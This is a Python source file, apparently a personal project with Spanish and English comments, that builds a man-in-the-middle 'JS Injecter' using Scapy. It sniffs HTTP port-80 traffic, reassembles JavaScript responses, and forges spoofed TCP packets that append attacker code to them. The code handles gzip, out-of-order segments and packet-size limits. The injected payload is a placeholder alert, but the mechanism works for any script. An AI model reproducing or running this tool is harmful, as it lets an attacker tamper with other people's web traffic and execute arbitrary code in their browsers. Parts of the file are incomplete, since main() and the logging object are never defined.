#VER SI LA WARNING SALE CUANDO LLEGA UN PSH,ACK QUE NO ES EL ULTIMO
#ARREGLAR IDENTACION DOBLE
#QUE DETERMINE SI ES EL ULTIMO SI ADEMAS DE SER UN PSH,ACK SU TAMAÑO ES MENOR
import gzip
import threading
import time
import configparser
import os

from scapy.all import *

SAVE_JS_FILES = 1 #should be an arg


class JS_Transaction(list): #type of list which contains JS transaction packets
    def __init__(self, ack_n, packets):
        super().__init__(packets)
        self.ack_n = ack_n

        if b"gzip" in self[0].load:
            self.load_encoding = "gzip"
        else:
            self.load_encoding = None

    def add_packet(self, packet):
        log.js.info_packet_traffic(self.ack_n, "recv_seq", seq=packet.seq, seqs=self.get_seq_numbers())
        self.append(packet)
        if packet.seq < self[-2].seq: #if the appended seq number is lower than the previous one,
            #it was an out of order packet. i think the fastest way to do this is sorting the whole list.
            self.sort(key = lambda x: x.seq)
            log.js.warning("out_of_order", id=packet.ack, seq=packet.seq)
            
    def get_code(self): #gets and returns the code of the js file. if there are missing packets
        #and the load is encoded, an error will be raised while trying to decompress.
        js_code = b""
        for packet in self:
            js_code += packet.load
        js_code = js_code[js_code.find(b"\r\n\r\n")+4:]

        if self.load_encoding == "gzip":
            try:
                js_code = gzip.decompress(js_code)
            except Exception as err:
                log.js.error_decompressing(self.ack_n, err)
            
        return js_code.decode("utf-8", "ignore")
    
    def get_seq_numbers(self):
        result = [packet.seq for packet in self]
        return result
    
    def get_load_encoding(self):
        return self.load_encoding
    

class JS_Injecter(threading.Thread):
    def __init__(self, exit_event):
        super().__init__(name="JS-Injecter")
        self.exit_event = exit_event
        self.js_transactions = {}
        self.handled_packets = []
        
    def get_js_from_transaction(self, transaction_ack_number): #prettier to read than the below line
        return self.js_transactions[transaction_ack_number].get_code()

    def create_spoofed_answer(self, real_packet): #creates and returns a spoofed answer based on the packet.
        #this spoofed answer will contain the injected code
        code = bytes("\nalert('KISS YOU');","utf-8")

        #Ahora mismo simplemente se añade el codigo comprimido al JS, pero ocuparía menos espacio
        #si se descomprimiera el JS, se le añadiera el codigo y despues se comprimiera todo junto
        encoding = self.js_transactions[real_packet.ack].get_load_encoding() #gets the encoding
        #of the packet load. this information is in its js transaction.
        if encoding == "gzip":
            code = gzip.compress(code)
            
        spoof_load = real_packet.load + code
        spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst)/ \
                       TCP(sport=80, dport=real_packet["TCP"].dport, seq=real_packet["TCP"].seq, ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags)/ \
                       Raw(load=spoof_load)
        
        #send(spoof_packet, verbose=0)
        print(len(real_packet.load), len(spoof_packet.load))
        return spoof_packet

    def forward_packet(self, packet, spoofed):
        #forwards the received packet, or simply sends it if spoofed is set to True.
        #if spoofed is True, packet is already a crafted packet (spoofed answer) so it just has to be sent.
        if spoofed:
            new_packet = packet
            print("forwarding spoofed packet")
        else:
            #print("forwarding packet")
            #Ether(dst="c0:18:85:98:1e:83")/ \
            new_packet = IP(src=packet["IP"].src, dst=packet["IP"].dst)/ \
                         TCP(sport=packet["TCP"].sport, dport=packet["TCP"].dport, seq=packet["TCP"].seq, ack=packet["TCP"].ack, flags=packet["TCP"].flags)
            if packet.haslayer("Raw"):
                new_packet = new_packet/Raw(load=packet.load)
                
                

        if packet.haslayer("Raw"):
            max_length=1446 #esta parece ser la maxima longitud de paquete que soporta mi linux mint para 'curl example.com'
            if len(new_packet.load) > max_length: #
                log.js.warning("packet_len", length=len(new_packet.load), id=packet.ack, seq=packet.seq, spoofed=spoofed)
                new_packet.load = new_packet.load[:max_length] #si el paquete es demasiado grande, no lo soporta
                #1/09/18 dejo esto por el problema del tamaño limite de los paquetes, que parece ser diferente segun el ordenador
                #si me llega un paquete de 1450, tengo que coger solo los primeros 1445~ bytes y enviarlos. al recibirlos,
                #la victima se dara cuenta de que le faltan 5 bytes y los pedira. todo correcto.
                #sin embargo, cuando llegan paquetes demasiado grandes (sospecho que superiores a 2*max_length, 2892 en este caso)
                #no funciona.
        
        print("Forwarding packet", packet.ack, packet.seq, hex(packet.ack), hex(packet.seq), packet["TCP"].flags)
        send(new_packet, verbose=0)
        #new_packet.show2()
                       

    def has_packet_been_handled(self, ack, seq, has_raw):
        #returns True or False depending on if the packet has been handled before or not.
        #this is necessary because when the handle_packet method forwards a packet,
        #it is sniffed again, starting a loop
        result = ([ack,seq,has_raw] in self.handled_packets)
        return result
        
            
    def handle_packet(self, packet): #handles every tcp port 80 packet
        #packet.show()
        p_ack = packet["TCP"].ack
        p_seq = packet["TCP"].seq
        p_flags = packet["TCP"].flags
        spoofed = False
        
        print("Received packet", p_ack, p_seq, hex(p_ack), hex(p_seq), p_flags)
        
        if not self.has_packet_been_handled(p_ack, p_seq, packet.haslayer("Raw")): #dont handle a packet twice
            if packet.haslayer("Raw"):
                if b"Content-Type: application/javascript" in packet.load:
                    if p_flags == "A": #first packet of a js_transaction
                        #the JS_Transaction is created
                        self.js_transactions[p_ack] = JS_Transaction(p_ack, [packet])
                        log.js.info_packet_traffic(p_ack, "recv1", seq=p_seq)
                        
                    elif p_flags == "PA": #first and last packet of a js_transaction
                        #the JS_Transaction and the spoofed answer are created
                        self.js_transactions[p_ack] = JS_Transaction(p_ack, [packet])
                        log.js.info_packet_traffic(p_ack, "recv2", seq=p_seq)

                        packet = self.create_spoofed_answer(packet)
                        spoofed = True
                        
                        log.js.info_packet_traffic(p_ack, "sent_spoofed")
                        
                else:
                    if p_ack in self.js_transactions.keys(): #if the packet belongs to a js_transaction
                        if p_flags== "A": #it simply belongs to the transaction
                            #the packet is saved in its js transaction
                            self.js_transactions[p_ack].add_packet(packet)
                            
                        elif p_flags == "PA": #it is the last packet of a transaction. however, other packets may arrive out of order
                            #the packet is added to its js transaction and the spoofed answer is created
                            #eventhough it is not always the last packet. large transactions can have several psh/ack
                            #sometimes every packet except the last one are ack
                            #sometimes there's a psh/ack packet every 6 or 12 ack packets.
                            self.js_transactions[p_ack].add_packet(packet)
                            log.js.info_packet_traffic(p_ack, "recv3", seq=p_seq, length=len(self.js_transactions[p_ack]))
                        
                            packet = self.create_spoofed_answer(packet)
                            spoofed = True
                        
                            log.js.info_packet_traffic(p_ack, "sent_spoofed")
                            # ~ if len(packet.load) < 1410: #those are the real last packets
                            
                                # ~ log.js.info_packet_traffic(p_ack, "recv3", seq=p_seq, length=len(self.js_transactions[p_ack]))
                            
                                # ~ packet = self.create_spoofed_answer(packet)
                                # ~ spoofed = True
                            
                                # ~ log.js.info_packet_traffic(p_ack, "sent_spoofed")
                            # ~ else:
                                # ~ log.js.warning("psh_ack_not_last", id=p_ack, seq=p_seq)
                                
            #he cambiado esto porque hay algun paquete que tiene mismo ack y seq, pero uno tiene raw y otro no
            self.handled_packets.append([p_ack, p_seq, packet.haslayer("Raw")]) #each packet identification numbers (ack and seq)
            #are saved, so that the same packet isnt handled twice
            self.forward_packet(packet, spoofed) #forwards the received packet, or simply sends the spoofed answer
        # ~ else:
            # ~ log.js.warning("repeated", id=p_ack, seq=p_seq, has_raw=packet.haslayer("Raw"))
        
    def run(self):
        #sniffs every tcp port 80 packet that has a Raw layer. when the exit_event is set, it calls self.end
        print("[JS] JS Injecter started.")
        
        #SNIFF, al tener stopperTimeout y stopper, no es la funcion original de Scapy, sino una modificada por mi
        #ya que la original no tenía manera de pararse cuando se quisiera. más informacion en sendrecv de Scapy
        #lo malo de esto es que para de sniffear cada stopperTimeout segundos para comprobar si stopper devuelve True,
        #con lo que puede perder algun paquete en ese proceso (cuando escribo esto aun no se ha dado el caso)
        
        sniff(store=False, filter="tcp and src port 80", \
              prn=self.handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set)
        self.end()
        
    def end(self):
        #shows the results
        print("TRANSACTIONS:", len(self.js_transactions))
        print("ID IDHEX PACKETS FIRSTPKTLEN LASTPKTLEN")
        for tr in self.js_transactions.keys():
                print(tr, hex(tr), len(self.js_transactions[tr]), len(self.js_transactions[tr][0].load), \
                      len(self.js_transactions[tr][-1].load))
        if SAVE_JS_FILES: #hacer que los guarde
                print("Trying to get the code from the transactions..")
                for ack_n in self.js_transactions:
                    print(self.get_js_from_transaction(ack_n))
        print(len(self.handled_packets), "packets have been handled.")
        print("[JS] JS Injecter finished.")


##def wait_until_all_threads_terminate():
##    #first way
##    for t in threading.enumerate():
##        if t.getName() != "MainThread" and type(t) != PowerShell:
##            #print("Waiting for thread", t.getName(), "to finish...")
##            t.join()
##            #print("Thread", t.getName(), "finished.")







    
if __name__ == "__main__":
    main()
